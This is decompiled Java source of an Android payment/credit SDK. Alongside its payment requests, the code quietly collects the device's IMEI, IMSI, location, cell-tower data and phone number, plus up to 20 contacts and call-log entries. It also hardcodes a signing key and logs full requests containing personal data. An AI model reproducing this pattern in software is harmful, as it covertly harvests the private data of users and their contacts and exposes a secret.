package com.uubee.prepay.core;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.DisplayMetrics;
import cn.fraudmetrix.android.FMAgent;
import com.google.gson.Gson;
import com.uubee.prepay.model.PayResult;
import com.uubee.prepay.model.QueryOrder;
import com.uubee.prepay.net.BaseRequest;
import com.uubee.prepay.net.BaseResponse;
import com.uubee.prepay.net.NetUtil;
import com.uubee.prepay.net.PrepayRequest.Builder;
import com.uubee.prepay.util.DebugLog;
import com.uubee.prepay.util.Utils;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.Enumeration;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import org.apache.http.conn.util.InetAddressUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public enum PrePayImpl {
	INSTANCE;

	private static final int MAX_CALL_LIST_SIZE = 20;
	private String imei;
	private String imsi;
	private String machine_id;
	private String ip_address;
	private Gson mGson = new Gson();
	private Lock mLock = new ReentrantLock();
	private CopyOnWriteArrayList<String> mInfoList = new CopyOnWriteArrayList();

	private PrePayImpl() {
	}

	private String createQueryInfo(String reqJson) {
		QueryOrder order = (QueryOrder) this.mGson.fromJson(reqJson,
				QueryOrder.class);
		return this.mGson.toJson(order, QueryOrder.class);
	}

	private void putExtraParams(Context context, JSONObject json)
			throws JSONException {
		if (json != null) {
			try {
				this.putLocationInfo(context, json);
			} catch (Exception var7) {
				var7.printStackTrace();
			}

			try {
				this.putStationInfo(context, json);
			} catch (Exception var6) {
				var6.printStackTrace();
			}

			try {
				this.putNetworkInfo(context, json);
			} catch (Exception var5) {
				var5.printStackTrace();
			}

			try {
				this.putPhoneInfo(json);
			} catch (Exception var4) {
				var4.printStackTrace();
			}

			DebugLog.d("putExtraParams finish");
		}
	}

	private void putLocationInfo(Context context, JSONObject json)
			throws JSONException {
		LocationManager lm = (LocationManager) context
				.getSystemService("location");
		Location location = lm.getLastKnownLocation("gps");
		if (location != null) {
			json.put("latitude", location.getLatitude());
			json.put("longitude", location.getLongitude());
		}
	}

	private void putStationInfo(Context context, JSONObject json)
			throws JSONException {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService("phone");
		String operator = tm.getNetworkOperator();
		if (operator != null) {
			int mcc = Integer.parseInt(operator.substring(0, 3));
			int mnc = Integer.parseInt(operator.substring(3));
			int lac = 0;
			int cellId = 0;
			CellLocation cl = tm.getCellLocation();
			if (cl != null) {
				if (mnc != 0 && mnc != 1) {
					if (cl instanceof CdmaCellLocation) {
						cellId = ((CdmaCellLocation) cl).getNetworkId();
						lac = ((CdmaCellLocation) cl).getBaseStationId();
						json.put("net_work", "中国电信");
					}
				} else if (cl instanceof GsmCellLocation) {
					cellId = ((GsmCellLocation) cl).getCid();
					lac = ((GsmCellLocation) cl).getLac();
					if (mnc == 0) {
						json.put("net_work", "中国移动");
					} else {
						json.put("net_work", "中国联通");
					}
				}

				String info = mcc + "," + mnc + "," + lac + "," + cellId;
				DebugLog.d("station_info : " + info);
				json.put("station_info", info);
			}
		}
	}

	private void putNetworkInfo(Context context, JSONObject json)
			throws JSONException {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService("connectivity");
		NetworkInfo info = cm.getActiveNetworkInfo();
		if (info != null) {
			int type = info.getType();
			String typeStr;
			if (type == 0) {
				typeStr = "mobile";
			} else if (type == 1) {
				typeStr = "wifi";
			} else {
				typeStr = "other";
			}

			json.put("net_type", typeStr);
			DebugLog.d("net_type : " + typeStr);
		}

	}

	private void putContactsInfo(Context context, JSONObject json) {
		if (json != null) {
			try {
				JSONArray e = this.getContactsInfo(context);
				if (e.length() > 0) {
					json.put("mob_list", e);
				}
			} catch (Exception var4) {
				var4.printStackTrace();
			}

		}
	}

	private void putCallsList(Context context, JSONObject json)
			throws JSONException {
		if (json != null) {
			JSONArray array = new JSONArray();
			Cursor cursor = null;

			try {
				cursor = context.getContentResolver().query(Calls.CONTENT_URI,
						new String[] { "name", "number" }, (String) null,
						(String[]) null, "date DESC");
				if (cursor != null) {
					while (true) {
						if (cursor.moveToNext()) {
							JSONObject e = new JSONObject();
							String talkname = cursor.getString(0);
							if (talkname == null || talkname.isEmpty()) {
								continue;
							}

							e.put("talk_name", cursor.getString(0));
							e.put("talk_number", cursor.getString(1));
							if (!e.isNull("talk_number")) {
								array.put(e);
							}

							if (array.length() < 20) {
								continue;
							}
						}

						if (array.length() > 0) {
							json.put("talk_list", array);
						}

						return;
					}
				}
			} catch (SecurityException var10) {
				var10.printStackTrace();
				return;
			} finally {
				if (cursor != null) {
					cursor.close();
				}

			}

		}
	}

	private JSONArray getContactsInfo(Context context) throws JSONException,
			SecurityException {
		JSONArray array = new JSONArray();
		ContentResolver resolver = context.getContentResolver();
		Uri uri = Contacts.CONTENT_URI;
		String[] projection = new String[] { "_id", "display_name" };
		Cursor cursor = resolver.query(uri, projection, (String) null,
				(String[]) null, (String) null);
		if (cursor == null) {
			return array;
		} else {
			uri = Phone.CONTENT_URI;
			projection = new String[] { "data1" };

			try {
				while (cursor.moveToNext()) {
					JSONObject item = new JSONObject();
					int id = cursor.getInt(0);
					String name = cursor.getString(1);
					item.put("mob_name", name);
					String selection = "contact_id=" + id;
					Cursor phoneCursor = resolver.query(uri, projection,
							selection, (String[]) null, (String) null);
					if (phoneCursor != null) {
						try {
							if (phoneCursor.moveToNext()) {
								String number = phoneCursor.getString(0);
								number = number.replaceAll("\\D", "");
								item.put("mob_number", number);
							}
						} finally {
							phoneCursor.close();
						}

						array.put(item);
						if (array.length() >= 20) {
							break;
						}
					}
				}
			} finally {
				cursor.close();
			}

			return array;
		}
	}

	private void putPhoneInfo(JSONObject json) throws JSONException {
		json.put("manufacturer", Build.MANUFACTURER)
				.put("os_mode", Build.MODEL).put("os_sdk", VERSION.SDK_INT)
				.put("os_release", VERSION.RELEASE);
	}

	private BaseRequest createRequest(Context context, String reqJson,
			int transcode) throws JSONException {
		if (transcode == 6001) {
			reqJson = this.createQueryInfo(reqJson);
		}

		JSONObject json = new JSONObject(reqJson);
		json.put("imei_mob", this.getIMEI(context));
		json.put("imsi_mob", this.getIMSI(context));
		json.put("id_machine", this.getMachineId(context));
		json.put("ip_address", this.getDeviceIpAddress());
		json.put("transcode", transcode);
		json.put("flag_chnl", "1");
		json.put("Screen", this.getScreen(context));
		this.putExtraParams(context, json);
		String order;
		if (transcode == 6008 || transcode == 6003) {
			try {
				order = FMAgent.onEvent();
				json.put("black_box", order);
			} catch (Exception var8) {
				var8.printStackTrace();
			}

			order = json.getString("user_id");
			if (!this.mInfoList.contains(order)) {
				TelephonyManager url = (TelephonyManager) context
						.getSystemService("phone");
				String builder = url.getLine1Number();
				if (builder != null) {
					json.put("mob_simk", builder);
				}

				this.putContactsInfo(context, json);
				this.putCallsList(context, json);
			}
		}

		Utils.changeName(json, "sign", "partner_sign");
		Utils.changeName(json, "sign_type", "partner_sign_type");
		order = json.toString();
		DebugLog.e("order: " + order);
		String url1 = Utils.getRequestUrl(transcode);
		Builder builder1 = new Builder(url1, order);
		return builder1.setSignKey("uubee1234567890").build();
	}

	private String getIMEI(Context context) {
		String tm1;
		try {
			this.mLock.lock();
			if (this.imei == null) {
				TelephonyManager tm = (TelephonyManager) context
						.getSystemService("phone");
				this.imei = tm.getDeviceId();
			}

			tm1 = this.imei;
		} finally {
			this.mLock.unlock();
		}

		return tm1;
	}

	private String getIMSI(Context context) {
		String tm1;
		try {
			this.mLock.lock();
			if (this.imsi == null) {
				TelephonyManager tm = (TelephonyManager) context
						.getSystemService("phone");
				this.imsi = tm.getSubscriberId();
			}

			tm1 = this.imsi;
		} finally {
			this.mLock.unlock();
		}

		return tm1;
	}

	private String getMachineId(Context context) {
		String var2;
		try {
			this.mLock.lock();
			if (this.machine_id == null) {
				this.machine_id = this.getDeviceMachineId(context);
			}

			var2 = this.machine_id;
		} finally {
			this.mLock.unlock();
		}

		return var2;
	}

	private String getDeviceMachineId(Context context) {
		String device_id = this.imei;
		String subscriber_id = this.imsi;
		String tmDevice = (Utils.isNull(device_id) ? "" : device_id)
				+ (Utils.isNull(subscriber_id) ? "" : subscriber_id);
		if (Utils.isNull(tmDevice)) {
			WifiInfo deviceUuid = ((WifiManager) context
					.getSystemService("wifi")).getConnectionInfo();
			tmDevice = deviceUuid.getMacAddress();
		}

		UUID deviceUuid1 = new UUID((long) tmDevice.hashCode(),
				(long) tmDevice.hashCode() << 32 | (long) tmDevice.hashCode());
		return deviceUuid1.toString();
	}

	private String getDeviceIpAddress() {
		try {
			Enumeration e = NetworkInterface.getNetworkInterfaces();

			while (e.hasMoreElements()) {
				NetworkInterface nif = (NetworkInterface) e.nextElement();
				Enumeration inet = nif.getInetAddresses();

				while (inet.hasMoreElements()) {
					InetAddress ip = (InetAddress) inet.nextElement();
					if (!ip.isLoopbackAddress()
							&& InetAddressUtils.isIPv4Address(ip
									.getHostAddress())) {
						return this.ip_address = ip.getHostAddress();
					}
				}
			}
		} catch (SocketException var5) {
			var5.printStackTrace();
		}

		return this.ip_address;
	}

	private String getScreen(Context context) {
		DisplayMetrics dm = context.getResources().getDisplayMetrics();
		return dm.widthPixels + "*" + dm.heightPixels;
	}

	private PayResult getPayResult(Context context, String reqJson,
			int transcode) {
		PayResult payResult;
		try {
			BaseRequest e = this.createRequest(context, reqJson, transcode);
			BaseResponse msg1 = NetUtil.INSTANCE.submit(e);
			payResult = new PayResult(msg1.body);
			if (6008 == transcode || 6002 == transcode || 6003 == transcode) {
				String userId = (new JSONObject(reqJson)).getString("user_id");
				this.mInfoList.add(userId);
			}
		} catch (IOException var8) {
			DebugLog.e("error : " + var8.getMessage());
			var8.printStackTrace();
			String msg;
			if (var8 instanceof SocketTimeoutException) {
				msg = "读取响应超时";
			} else {
				msg = var8.getMessage();
			}

			payResult = PayResult.createPayResult(
					"{\'ret_code\':\'700002\',\'ret_msg\':\'支付服务超时，请重新支付\'}",
					msg);
		} catch (JSONException var9) {
			DebugLog.e("error : " + var9.getMessage());
			var9.printStackTrace();
			payResult = PayResult.createPayResult(
					"{\'ret_code\':\'700001\',\'ret_msg\':\'商户请求参数校验错误[%s]\'}",
					var9.getMessage());
		}

		return payResult;
	}

	public PayResult creditQuery(Context context, String reqJson) {
		DebugLog.d("do creditQuery,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6001);
	}

	public PayResult orderInit(Context context, String reqJson) {
		DebugLog.d("do orderInit,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6007);
	}

	public PayResult createOrder(Context context, String reqJson) {
		DebugLog.e("do createOrder,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6008);
	}

	public PayResult creditApply(Context context, String reqJson) {
		DebugLog.d("do creditApply,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6002);
	}

	public PayResult creditPay(Context context, String reqJson) {
		DebugLog.d("do creditPay,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6003);
	}

	public PayResult billQuery(Context context, String reqJson) {
		DebugLog.e("do billQuery,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6004);
	}

	PayResult userActive(Context context, String reqJson) {
		DebugLog.d("do userActive,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6005);
	}

	PayResult getMsgVerifyCode(Context context, String reqJson) {
		DebugLog.d("do getMsgVerifyCode,req = " + reqJson);
		return this.getPayResult(context, reqJson, 6006);
	}
}
